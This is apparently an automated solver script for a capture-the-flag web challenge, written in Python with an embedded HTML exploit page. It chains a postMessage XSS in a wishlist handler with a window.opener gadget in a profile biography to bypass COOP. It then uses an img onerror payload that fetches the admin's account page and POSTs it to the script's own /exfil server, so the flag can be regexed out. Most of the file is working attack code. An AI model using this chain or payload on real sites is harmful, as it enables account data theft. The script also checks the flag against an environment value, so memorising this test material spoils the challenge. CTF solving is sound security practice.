import os
import re
import socket
import threading
import time
import uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

import requests

TARGET_HOST = os.environ.get("SERVICE_OPEN_SESAME_WEB_HOST", "127.0.0.1")
TARGET_PORT = os.environ.get("SERVICE_OPEN_SESAME_WEB_PORT", "3000")
BASE_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"
# The bot visits URLs from *inside* the target container's own network
# namespace, where the app is only reachable at its own listen address --
# the challenge description itself hints at this ("Use 'http://localhost:3000'
# as the target URL in your exploit"), confirmed via source/config.js's
# default PORT=3000.
INTERNAL_URL = "http://localhost:3000"

# =============================================================================
# Challenge summary (adapted from the author's own checker/exploit.html +
# README writeup into a fully automated, self-hosted exploit)
# =============================================================================
#
# The "captain" account's `sesame_password` field holds the real FLAG and is
# rendered in plaintext on /my-account -- but only the captain (and the bot,
# which the /report endpoint drives as the captain) can view their own
# account page.
#
# Two gadgets, chained:
#   1. XSS via postMessage: /my-account listens for `{type: "wishlist", ...}"
#      postMessage events (no origin check) and renders `items` through
#      jQuery DataTable(), which innerHTMLs `item_name` with no sanitization
#      -- an easy stored/reflected-style XSS once we can reach that handler.
#   2. COOP bypass via a profile-page gadget: COOP is
#      "same-origin-allow-popups" and X-Frame-Options is DENY, so neither
#      <iframe> nor window.open() across origins can get a `window`
#      reference to the target. But the profile page (/profile/:username)
#      renders the user's (DOMPurify-sanitized, but `target` is allowlisted)
#      biography and auto-clicks a `?click=<selector>` CSS selector on load.
#      A biography containing `<a href="OUR_URL" target="_blank"
#      rel="opener" id="exp">` auto-opens a same-origin popup with
#      `window.opener` preserved (COOP still allows that, since it's a
#      same-origin *popup*), giving our hosted page a live reference to the
#      captain's open window.
#
# Flow:
#   1. Register an attacker account whose biography is that `<a>` gadget,
#      pointing at an exploit page we host ourselves.
#   2. Log in and POST /report with
#      `BASE_URL/profile/<attacker>?click=%23exp` -- the bot visits this
#      *as the captain* (its own puppeteer page gets a cookie for the
#      captain's session, independent of our own login).
#   3. The auto-click opens our hosted exploit page as a popup with
#      `window.opener` pointing at the captain's tab. Our page then:
#        a. navigates `window.opener.location` to `/my-account` (so the
#           postMessage listener for `wishlist` gets attached)
#        b. posts a `wishlist` message whose `item_name` is an
#           `<img onerror=...>` payload that fetches `/my-account` (now
#           rendered with the captain's real sesame_password = FLAG) and
#           POSTs the HTML back to an `/exfil` endpoint on our own server
#           (swapped in for the original oastify/Collaborator callback).
#   4. We just wait for that POST and regex out the flag.
# =============================================================================

exfil_event = threading.Event()
exfil_data = {"html": None}


class _ExploitHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path.startswith("/exploit.html"):
            body = EXPLOIT_HTML.encode()
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        if self.path.startswith("/exfil"):
            exfil_data["html"] = body.decode(errors="replace")
            exfil_event.set()
        self.send_response(200)
        self.end_headers()

    def log_message(self, fmt, *args):
        pass  # keep stdout focused on the exploit transcript


def start_http_server():
    server = ThreadingHTTPServer(("0.0.0.0", 8000), _ExploitHandler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    return server


def own_reachable_address():
    # Sibling pods in the cluster reach us over our own routable address;
    # our own hostname resolves to that (verified working in kernel-buddy).
    return socket.gethostbyname(socket.gethostname())


OWN_ADDR = own_reachable_address()
OWN_URL = f"http://{OWN_ADDR}:8000"

EXPLOIT_HTML = f"""<!DOCTYPE html>
<html>
<head></head>
<body>
<script>
let BASE_URL = '{INTERNAL_URL}';

setTimeout(() => {{
    window.opener.location = `${{BASE_URL}}/my-account`;

    setTimeout(() => {{
        window.opener.postMessage({{
            type: 'wishlist',
            items: [{{
                item_name: '<img src=x onerror="fetch(`/my-account`).then(res => res.text()).then(data => {{ fetch(`{OWN_URL}/exfil`, {{method: `POST`, body: data}}) }})">',
                rarity: 'Legendary',
                value: '999',
                added_at: '2026-01-01'
            }}]
        }}, '*');
    }}, 1500);
}}, 4000);
</script>
</body>
</html>"""


def main():
    start_http_server()

    s = requests.Session()
    attacker = f"attacker{uuid.uuid4().hex[:8]}"
    bio = f'<a href="{OWN_URL}/exploit.html" target="_blank" rel="opener" id="exp">Click me</a>'

    r = s.post(
        f"{BASE_URL}/register",
        data={
            "username": attacker,
            "password": "password123",
            "biography": bio,
            "sesame_password": "whatever",
        },
    )
    r.raise_for_status()
    print(f"[+] registered as {attacker}")

    report_url = f"{INTERNAL_URL}/profile/{attacker}?click=%23exp"
    r = s.post(f"{BASE_URL}/api/report", data={"url": report_url})
    r.raise_for_status()
    print(f"[+] reported {report_url}")

    print("[*] waiting for exfil callback...")
    if not exfil_event.wait(timeout=60):
        raise SystemExit("timed out waiting for exfiltrated /my-account HTML")

    html = exfil_data["html"]
    m = re.search(r"SCC\{[^}<\"]+\}", html)
    flag = m.group(0) if m else ""
    print(f"[+] exfiltrated flag: {flag}")

    flag_env = os.environ.get("flag_flag")
    if not flag or (flag_env and flag_env not in flag):
        raise SystemExit(f"flag mismatch: expected {flag_env!r} to be in {flag!r}")


if __name__ == "__main__":
    main()
